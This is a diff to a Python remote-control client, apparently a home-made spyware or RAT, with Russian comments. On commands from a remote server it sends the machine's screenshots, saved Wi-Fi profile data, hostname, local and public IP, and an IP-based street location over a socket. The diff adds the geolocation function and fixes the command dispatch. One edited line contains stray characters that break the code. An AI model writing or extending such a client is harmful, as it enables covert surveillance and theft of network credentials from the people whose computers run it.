@@ -6,8 +6,26 @@ from mss import mss
 from requests import get
 import os
 import json
-import requests
+from geopy.geocoders import Nominatim
+import geocoder
+import re
 #asd
+def locale(client_socket):
+    # initialize the Nominatim object
+    Nomi_locator = Nominatim(user_agent="My App")
+
+    my_location = geocoder.ip('me')
+
+    # my latitude and longitude coordinates
+    latitude = my_location.geojson['features'][0]['properties']['lat']
+    longitude = my_location.geojson['features'][0]['properties']['lng']
+
+    # get the location
+    location = Nomi_locator.reverse(f"{latitude}, {longitude}")
+    print(location)
+    message = f".{location}"
+    client_socket.send(message.encode('utf-8'))
+
 def screen(client_socket):
     message = ".img"
     client_socket.send(message.encode('utf-8'))
@@ -30,7 +48,7 @@ def screen(client_socket):
 
 def wifi(client_socket):
     # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],stderr=subprocess.DEVNULLпущ).decode('cp866').split('\n')
     # Создаем список всех названий всех профилей сети (имена сетей)
     Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
     # Для каждого имени...
@@ -53,8 +71,8 @@ def wifi(client_socket):
 def system(client_socket):
     hostname = socket.gethostname()
     local_ip = socket.gethostbyname(hostname)
-    public_ip = get('').text
-    message = (f'.Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
+    public_ip = get('http://api.ipify.org').text
+    message = f'.Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}'
     client_socket.send(message.encode('utf-8'))
 
 def obr(message,client_socket):
@@ -64,7 +82,7 @@ def obr(message,client_socket):
         case "/wifi": wifi(client_socket)
         case "/system": system(client_socket)
         case "/screen": screen(client_socket)
-        case "/locale": location(client_socket)
+        case "/locale": locale(client_socket)
         case _:
             message = ".Неизвесная команда"
             client_socket.send(message.encode('utf-8'))
@@ -75,15 +93,11 @@ def obr(message,client_socket):
 
 def receive_messages(client_socket):
   while True:
-    try:
       message = client_socket.recv(1024).decode('utf-8')
       if message:
         obr(message,client_socket)
       else:
         break
-    except:
-      print("Ошибка подключения.")
-      break
 
 def start_client():
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -104,11 +118,8 @@ def start_client():
 #    client.send(message.encode('utf-8'))
 
 #  client.close()
-import re
 
-def location(client_socket):
-    message = requests.get("https://geolocation-db.com/json/39.110.142.79&position=true").json()
-    client_socket.send(message)
+
 
 if __name__ == "__main__":
-  start_client()
+    start_client()
